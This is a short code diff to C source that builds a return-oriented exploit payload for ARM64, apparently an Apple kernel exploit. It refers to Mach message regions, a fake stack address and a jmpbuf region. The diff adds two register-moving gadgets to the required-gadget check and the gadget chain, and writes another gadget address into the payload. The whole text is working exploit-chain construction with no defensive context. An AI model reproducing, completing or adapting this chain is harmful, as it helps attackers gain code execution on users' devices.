@@ -343,6 +343,8 @@ check_platform() {
 	NEED(STR_X1_X19_80__BLR_X8);
 	NEED(MOV_X0_X26__BLR_X8);
 	NEED(SUB_X1_X1_X0__BLR_X8);
+    NEED(MOV_X6_X1__BLR_X8);
+    NEED(MOV_X5_X6__BLR_X8);
 	NEED(MOV_X13_X1__BR_X8);
 	NEED(MOV_X9_X13__BR_X8);
 	NEED(MOV_X11_X24__BR_X8);
@@ -427,6 +429,7 @@ build_payload(uint8_t *payload) {
 	*(uint64_t *)(payload_REGION_JMPBUF + 0x30) = gadgets[LDP_X8_X2_X19__BLR_X8].address;
 	*(uint64_t *)(payload_REGION_JMPBUF + 0x38) = MAX_REMOTE_AND_LOCAL_PORT;
 	*(uint64_t *)(payload_REGION_JMPBUF + 0x40) = address_REGION_MACH_MESSAGE;
+	*(uint64_t *)(payload_REGION_JMPBUF + 0x48) = gadgets[LDP_X8_X2_X19__BLR_X8].address;
 	*(uint64_t *)(payload_REGION_JMPBUF + 0x58) = gadgets[LDP_X8_X2_X19__BLR_X8].address;
 	*(uint64_t *)(payload_REGION_JMPBUF + 0x68) = FAKE_STACK_ADDRESS;
 
@@ -455,6 +458,8 @@ build_payload(uint8_t *payload) {
 		STR_X1_X19_80__BLR_X8,
 		MOV_X0_X26__BLR_X8,
 		SUB_X1_X1_X0__BLR_X8,
+        MOV_X6_X1__BLR_X8,
+        MOV_X5_X6__BLR_X8,
 		MOV_X13_X1__BR_X8,
 		MOV_X9_X13__BR_X8,
 		MOV_X11_X24__BR_X8,
